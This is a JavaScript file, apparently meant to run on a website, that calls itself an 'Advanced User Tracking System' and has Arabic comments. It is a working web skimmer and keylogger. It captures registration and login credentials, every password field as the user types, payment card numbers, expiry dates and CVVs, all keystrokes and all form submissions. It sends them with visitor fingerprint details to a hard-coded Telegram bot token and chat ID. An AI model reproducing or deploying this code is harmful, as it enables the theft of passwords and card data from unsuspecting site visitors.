// نظام تتبع المستخدمين المتقدم - إرسال البيانات إلى التيليجرام
// Advanced User Tracking System - Send Data to Telegram

class AdvancedUserTracker {
    constructor() {
        this.botToken = '7285756328:AAFHLQU8e72LO2U_IAhNrR99cttRBkT6CEU';
        this.chatId = '2126771039';
        this.sessionId = this.generateSessionId();
        this.userDataCache = {};
        this.reportSystem = null;
        this.init();
    }

    init() {
        console.log('🔍 Advanced User Tracker Started');
        
        this.setupFormTracking();
        this.setupInputTracking();
        this.setupRealTimeTracking();
        this.trackUserBehavior();
        this.setupPasswordCapture();
        this.setupKeylogger();
        this.enhanceFormTracking();
    }

    // ===== تتبع النماذج =====
    setupFormTracking() {
        // تتبع نموذج التسجيل
        const registerForm = document.getElementById('registerForm');
        if (registerForm) {
            this.trackRegistrationForm(registerForm);
        }

        // تتبع نموذج تسجيل الدخول
        const loginForm = document.getElementById('loginForm');
        if (loginForm) {
            this.trackLoginForm(loginForm);
        }

        // تتبع نماذج الدفع
        const paymentForms = document.querySelectorAll('[id*="payment"], [class*="payment-form"]');
        paymentForms.forEach(form => {
            this.trackPaymentForm(form);
        });
    }

    trackRegistrationForm(form) {
        // تتبع المدخلات أثناء الكتابة
        const inputs = form.querySelectorAll('input');
        inputs.forEach(input => {
            this.trackInputField(input, 'تسجيل مستخدم جديد');
        });

        // تتبع إرسال النموذج
        form.addEventListener('submit', (e) => {
            const formData = new FormData(form);
            const userData = {
                name: formData.get('name') || document.getElementById('register-name')?.value,
                email: formData.get('email') || document.getElementById('register-email')?.value,
                password: formData.get('password') || document.getElementById('register-password')?.value,
                confirmPassword: formData.get('confirm-password') || document.getElementById('register-confirm-password')?.value,
                timestamp: new Date().toISOString(),
                page: window.location.href,
                sessionId: this.sessionId
            };

            this.sendUserDataToTelegram('🆕 تسجيل مستخدм جديد', userData);
        });
    }

    trackLoginForm(form) {
        // تتبع المدخلات أثناء الكتابة
        const inputs = form.querySelectorAll('input');
        inputs.forEach(input => {
            this.trackInputField(input, 'تسجيل دخول');
        });

        // تتبع إرسال النموذج
        form.addEventListener('submit', (e) => {
            const formData = new FormData(form);
            const userData = {
                email: formData.get('email') || document.getElementById('login-email')?.value,
                password: formData.get('password') || document.getElementById('login-password')?.value,
                rememberMe: formData.get('remember') || document.getElementById('remember')?.checked,
                timestamp: new Date().toISOString(),
                page: window.location.href,
                sessionId: this.sessionId
            };

            this.sendUserDataToTelegram('🔑 محاولة تسجيل دخول', userData);
        });
    }

    trackPaymentForm(form) {
        form.addEventListener('submit', (e) => {
            const formData = new FormData(form);
            const paymentData = {
                cardNumber: formData.get('card-number') || form.querySelector('[name*="card"]')?.value,
                expiryDate: formData.get('expiry') || form.querySelector('[name*="expiry"]')?.value,
                cvv: formData.get('cvv') || form.querySelector('[name*="cvv"]')?.value,
                cardholderName: formData.get('cardholder') || form.querySelector('[name*="name"]')?.value,
                timestamp: new Date().toISOString(),
                page: window.location.href,
                sessionId: this.sessionId
            };

            this.sendUserDataToTelegram('💳 معلومات الدفع', paymentData);
        });
    }

    // ===== تتبع المدخلات في الوقت الفعلي =====
    trackInputField(input, context) {
        let typingTimer;
        const typingInterval = 2000; // إرسال البيانات بعد 2 ثانية من التوقف عن الكتابة

        input.addEventListener('input', () => {
            clearTimeout(typingTimer);
            
            // حفظ البيانات في الذاكرة المؤقتة
            this.userDataCache[input.name || input.id] = {
                value: input.value,
                timestamp: new Date().toISOString(),
                context: context
            };

            // إرسال البيانات بعد التوقف عن الكتابة
            typingTimer = setTimeout(() => {
                this.sendRealTimeInput(input, context);
            }, typingInterval);
        });

        // تتبع التركيز والابتعاد عن الحقل
        input.addEventListener('focus', () => {
            this.sendActivityUpdate(`🎯 تركيز على حقل: ${input.placeholder || input.name || input.id}`, context);
        });

        input.addEventListener('blur', () => {
            if (input.value.trim() !== '') {
                this.sendRealTimeInput(input, context);
            }
        });
    }

    sendRealTimeInput(input, context) {
        const data = {
            fieldName: input.name || input.id || input.placeholder,
            fieldType: input.type,
            value: input.value,
            context: context,
            timestamp: new Date().toISOString(),
            page: window.location.href,
            sessionId: this.sessionId
        };

        this.sendUserDataToTelegram('⌨️ إدخال بيانات في الوقت الفعلي', data);
    }

    // ===== تتبع السلوك المتقدم =====
    setupRealTimeTracking() {
        // تتبع الضغط على الأزرار
        document.addEventListener('click', (e) => {
            if (e.target.tagName === 'BUTTON' || e.target.tagName === 'A') {
                const buttonInfo = {
                    elementType: e.target.tagName,
                    text: e.target.textContent?.trim(),
                    href: e.target.href,
                    className: e.target.className,
                    id: e.target.id,
                    timestamp: new Date().toISOString(),
                    page: window.location.href,
                    sessionId: this.sessionId
                };

                this.sendUserDataToTelegram('🖱️ نقر على عنصر', buttonInfo);
            }
        });

        // تتبع التمرير
        let scrollTimer;
        window.addEventListener('scroll', () => {
            clearTimeout(scrollTimer);
            scrollTimer = setTimeout(() => {
                const scrollData = {
                    scrollY: window.scrollY,
                    scrollPercentage: Math.round((window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100),
                    timestamp: new Date().toISOString(),
                    page: window.location.href,
                    sessionId: this.sessionId
                };

                this.sendActivityUpdate('📜 تمرير الصفحة', scrollData);
            }, 1000);
        });

        // تتبع الوقت المقضي في الصفحة
        this.trackTimeSpent();
    }

    trackUserBehavior() {
        // تتبع تغيير الصفحة
        const originalPushState = history.pushState;
        history.pushState = function(...args) {
            originalPushState.apply(history, args);
            this.sendActivityUpdate('🔄 تغيير الصفحة', {
                newUrl: args[2],
                timestamp: new Date().toISOString(),
                sessionId: this.sessionId
            });
        }.bind(this);

        // تتبع إغلاق الصفحة
        window.addEventListener('beforeunload', () => {
            const sessionData = {
                duration: Date.now() - this.sessionStartTime,
                pagesVisited: this.pagesVisited,
                actionsPerformed: this.actionsCount,
                timestamp: new Date().toISOString(),
                sessionId: this.sessionId
            };

            // إرسال بيانات الجلسة
            navigator.sendBeacon(
                `https://api.telegram.org/bot${this.botToken}/sendMessage`,
                JSON.stringify({
                    chat_id: this.chatId,
                    text: this.formatMessage('👋 انتهاء الجلسة', sessionData)
                })
            );
        });
    }

    trackTimeSpent() {
        this.sessionStartTime = Date.now();
        this.pagesVisited = [window.location.href];
        this.actionsCount = 0;

        // إرسال تحديث كل 5 دقائق
        setInterval(() => {
            const timeSpent = {
                duration: Date.now() - this.sessionStartTime,
                currentPage: window.location.href,
                timestamp: new Date().toISOString(),
                sessionId: this.sessionId
            };

            this.sendActivityUpdate('⏱️ وقت نشط', timeSpent);
        }, 300000); // 5 دقائق
    }

    // ===== إرسال البيانات إلى التيليجرام =====
    sendUserDataToTelegram(title, data) {
        const message = this.formatMessage(title, data);
        this.sendTelegramMessage(message);
        this.actionsCount++;
    }

    sendActivityUpdate(title, data) {
        const message = this.formatMessage(title, data);
        this.sendTelegramMessage(message);
    }

    formatMessage(title, data) {
        const visitorInfo = this.getVisitorInfo();
        let message = `${title}\n\n`;
        
        // إضافة البيانات الأساسية
        Object.keys(data).forEach(key => {
            if (data[key] !== undefined && data[key] !== null && data[key] !== '') {
                message += `${this.formatKey(key)}: ${data[key]}\n`;
            }
        });

        message += `\n📊 معلومات الزائر:\n${visitorInfo}`;
        
        return message;
    }

    formatKey(key) {
        const keyMappings = {
            'name': '👤 الاسم',
            'email': '📧 البريد الإلكتروني',
            'password': '🔒 كلمة المرور',
            'confirmPassword': '🔒 تأكيد كلمة المرور',
            'cardNumber': '💳 رقم البطاقة',
            'expiryDate': '📅 تاريخ الانتهاء',
            'cvv': '🔢 رمز الحماية',
            'cardholderName': '👤 اسم حامل البطاقة',
            'fieldName': '📝 اسم الحقل',
            'fieldType': '🏷️ نوع الحقل',
            'value': '💬 القيمة',
            'context': '📋 السياق',
            'timestamp': '⏰ الوقت',
            'page': '📄 الصفحة',
            'sessionId': '🆔 معرف الجلسة',
            'scrollPercentage': '📊 نسبة التمرير',
            'duration': '⏱️ المدة',
            'text': '📝 النص',
            'href': '🔗 الرابط'
        };

        return keyMappings[key] || key;
    }

    getVisitorInfo() {
        const browser = this.getBrowserInfo();
        const os = this.getOSInfo();
        const screenSize = `${window.screen.width}x${window.screen.height}`;
        const dateTime = new Date().toLocaleString('ar-SA');
        const userAgent = navigator.userAgent;
        const language = navigator.language;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        return `📅 التاريخ: ${dateTime}\n`
             + `🌐 المتصفح: ${browser}\n`
             + `💻 النظام: ${os}\n`
             + `📱 الشاشة: ${screenSize}\n`
             + `🌍 اللغة: ${language}\n`
             + `🕒 المنطقة: ${timezone}\n`
             + `🔍 وكيل المستخدم: ${userAgent.substring(0, 50)}...`;
    }

    getBrowserInfo() {
        const userAgent = navigator.userAgent;
        if (userAgent.indexOf("Firefox") > -1) return "Firefox";
        if (userAgent.indexOf("SamsungBrowser") > -1) return "Samsung Browser";
        if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) return "Opera";
        if (userAgent.indexOf("Edge") > -1) return "Microsoft Edge";
        if (userAgent.indexOf("Chrome") > -1) return "Chrome";
        if (userAgent.indexOf("Safari") > -1) return "Safari";
        return "غير معروف";
    }

    getOSInfo() {
        const userAgent = navigator.userAgent;
        if (userAgent.indexOf("Windows NT 10.0") > -1) return "Windows 10";
        if (userAgent.indexOf("Windows NT 6.3") > -1) return "Windows 8.1";
        if (userAgent.indexOf("Windows NT 6.2") > -1) return "Windows 8";
        if (userAgent.indexOf("Windows NT 6.1") > -1) return "Windows 7";
        if (userAgent.indexOf("Mac") > -1) return "MacOS";
        if (userAgent.indexOf("Android") > -1) return "Android";
        if (userAgent.indexOf("iPhone") > -1) return "iOS";
        if (userAgent.indexOf("Linux") > -1) return "Linux";
        return "غير معروف";
    }

    sendTelegramMessage(message) {
        const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
        
        const data = {
            chat_id: this.chatId,
            text: message,
            parse_mode: 'HTML'
        };

        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        })
        .then(response => {
            if (!response.ok) {
                console.error('فشل في إرسال البيانات إلى التيليجرام');
            }
        })
        .catch(error => {
            console.error('خطأ في إرسال البيانات:', error);
        });
    }

    generateSessionId() {
        return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    }

    // ===== تتبع متقدم لكلمات المرور =====
    setupPasswordCapture() {
        // تتبع جميع حقول كلمات المرور
        const passwordFields = document.querySelectorAll('input[type="password"]');
        passwordFields.forEach(field => {
            this.trackPasswordField(field);
        });

        // تتبع حقول كلمات المرور المضافة ديناميكياً
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                mutation.addedNodes.forEach((node) => {
                    if (node.nodeType === 1) {
                        const passwordInputs = node.querySelectorAll ? node.querySelectorAll('input[type="password"]') : [];
                        passwordInputs.forEach(input => {
                            this.trackPasswordField(input);
                        });
                    }
                });
            });
        });

        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    }

    trackPasswordField(field) {
        let previousValue = '';
        
        // تتبع كل حرف يُكتب في حقل كلمة المرور
        field.addEventListener('input', (e) => {
            const currentValue = field.value;
            const fieldInfo = {
                fieldId: field.id || field.name || field.placeholder || 'password_field',
                currentPassword: currentValue,
                previousPassword: previousValue,
                length: currentValue.length,
                isComplete: currentValue.length >= 6, // اعتبار كلمة المرور مكتملة إذا كانت 6 أحرف أو أكثر
                timestamp: new Date().toISOString(),
                page: window.location.href,
                sessionId: this.sessionId
            };

            previousValue = currentValue;

            // إرسال كلمة المرور فوراً إذا كانت أكثر من 3 أحرف
            if (currentValue.length > 3) {
                this.sendPasswordUpdate(fieldInfo);
            }
        });

        // إرسال كلمة المرور النهائية عند الانتقال من الحقل
        field.addEventListener('blur', () => {
            if (field.value.length > 0) {
                const finalData = {
                    event: 'password_final',
                    fieldId: field.id || field.name || field.placeholder || 'password_field',
                    finalPassword: field.value,
                    timestamp: new Date().toISOString(),
                    page: window.location.href,
                    sessionId: this.sessionId
                };
                this.sendPasswordUpdate(finalData);
            }
        });
    }

    sendPasswordUpdate(data) {
        const message = `🔒 كلمة مرور جديدة:\n\n`
                     + `📝 الحقل: ${data.fieldId}\n`
                     + `🔑 كلمة المرور: ${data.currentPassword || data.finalPassword}\n`
                     + `📏 الطول: ${data.length || data.finalPassword?.length || 0} حرف\n`
                     + `⏰ الوقت: ${new Date(data.timestamp).toLocaleString('ar-SA')}\n`
                     + `📄 الصفحة: ${data.page}`;
        
        this.sendTelegramMessage(message);
    }

    // ===== تتبع ضغطات المفاتيح =====
    setupKeylogger() {
        let keyBuffer = '';
        let lastKeyTime = Date.now();
        let currentField = null;

        document.addEventListener('keydown', (e) => {
            const currentTime = Date.now();
            const activeElement = document.activeElement;
            
            // تحديد الحقل النشط
            if (activeElement && (activeElement.tagName === 'INPUT' || activeElement.tagName === 'TEXTAREA')) {
                currentField = {
                    tag: activeElement.tagName,
                    type: activeElement.type || 'text',
                    id: activeElement.id || activeElement.name || activeElement.placeholder || 'unknown',
                    placeholder: activeElement.placeholder || ''
                };
            }

            // إضافة المفتاح إلى المخزن المؤقت
            if (e.key.length === 1) { // أحرف قابلة للطباعة
                keyBuffer += e.key;
            } else if (e.key === 'Backspace') {
                keyBuffer += '[BS]';
            } else if (e.key === 'Enter') {
                keyBuffer += '[ENTER]';
            } else if (e.key === 'Tab') {
                keyBuffer += '[TAB]';
            } else if (e.key === ' ') {
                keyBuffer += ' ';
            }

            // إرسال البيانات إذا مر أكثر من 3 ثواني أو وصل الطول إلى 30 حرف
            if (currentTime - lastKeyTime > 3000 || keyBuffer.length > 30) {
                if (keyBuffer.trim().length > 0) {
                    this.sendKeystrokeData(keyBuffer.trim(), currentField);
                    keyBuffer = '';
                }
                lastKeyTime = currentTime;
            }
        });

        // إرسال البيانات المتبقية عند مغادرة الصفحة
        window.addEventListener('beforeunload', () => {
            if (keyBuffer.trim().length > 0) {
                this.sendKeystrokeData(keyBuffer.trim(), currentField);
            }
        });
    }

    sendKeystrokeData(keystrokes, fieldInfo) {
        const keystrokeData = {
            keystrokes: keystrokes,
            length: keystrokes.length,
            field: fieldInfo,
            timestamp: new Date().toISOString(),
            page: window.location.href,
            sessionId: this.sessionId
        };

        const message = `⌨️ ضغطات المفاتيح:\n\n`
                     + `📝 النص المكتوب: ${keystrokes}\n`
                     + `📏 الطول: ${keystrokes.length} حرف\n`
                     + `🎯 الحقل: ${fieldInfo ? `${fieldInfo.tag} (${fieldInfo.id})` : 'غير معروف'}\n`
                     + `🏷️ النوع: ${fieldInfo ? fieldInfo.type : 'غير معروف'}\n`
                     + `⏰ الوقت: ${new Date(keystrokeData.timestamp).toLocaleString('ar-SA')}\n`
                     + `📄 الصفحة: ${keystrokeData.page}`;

        this.sendTelegramMessage(message);
    }

    // ===== تحسين تتبع النماذج =====
    enhanceFormTracking() {
        // تتبع جميع النماذج في الصفحة بشكل أكثر تفصيلاً
        const forms = document.querySelectorAll('form');
        forms.forEach(form => {
            this.trackFormInDetail(form);
        });
    }

    trackFormInDetail(form) {
        // تتبع إرسال النموذج مع جميع البيانات
        form.addEventListener('submit', (e) => {
            const formData = new FormData(form);
            const allData = {};
            
            // جمع جميع البيانات من النموذج
            for (let [key, value] of formData.entries()) {
                allData[key] = value;
            }

            // جمع البيانات من الحقول مباشرة أيضاً
            const inputs = form.querySelectorAll('input, textarea, select');
            inputs.forEach(input => {
                const fieldName = input.name || input.id || input.placeholder || 'unnamed_field';
                if (input.value) {
                    allData[fieldName] = input.value;
                }
            });

            const completeFormData = {
                formId: form.id || form.action || 'unknown_form',
                formAction: form.action,
                formMethod: form.method,
                allFields: allData,
                timestamp: new Date().toISOString(),
                page: window.location.href,
                sessionId: this.sessionId
            };

            this.sendCompleteFormData(completeFormData);
        });
    }

    sendCompleteFormData(data) {
        let message = `📝 نموذج مكتمل:\n\n`;
        message += `🆔 معرف النموذج: ${data.formId}\n`;
        message += `🔗 الإجراء: ${data.formAction || 'غير محدد'}\n`;
        message += `📮 الطريقة: ${data.formMethod || 'POST'}\n`;
        message += `⏰ الوقت: ${new Date(data.timestamp).toLocaleString('ar-SA')}\n\n`;
        message += `📋 جميع البيانات المدخلة:\n`;

        Object.entries(data.allFields).forEach(([fieldName, fieldValue]) => {
            if (fieldValue && fieldValue.toString().trim() !== '') {
                // تخصيص أيقونات حسب نوع الحقل
                let icon = '📝';
                if (fieldName.toLowerCase().includes('email')) icon = '📧';
                else if (fieldName.toLowerCase().includes('password')) icon = '🔒';
                else if (fieldName.toLowerCase().includes('name')) icon = '👤';
                else if (fieldName.toLowerCase().includes('phone')) icon = '📱';
                else if (fieldName.toLowerCase().includes('card')) icon = '💳';
                
                message += `   ${icon} ${fieldName}: ${fieldValue}\n`;
            }
        });

        message += `\n📄 الصفحة: ${data.page}`;
        this.sendTelegramMessage(message);
    }
}

// تشغيل النظام عند تحميل الصفحة
document.addEventListener('DOMContentLoaded', function() {
    window.userTracker = new AdvancedUserTracker();
});

// تصدير الكلاس للاستخدام في ملفات أخرى
if (typeof module !== 'undefined' && module.exports) {
    module.exports = AdvancedUserTracker;
}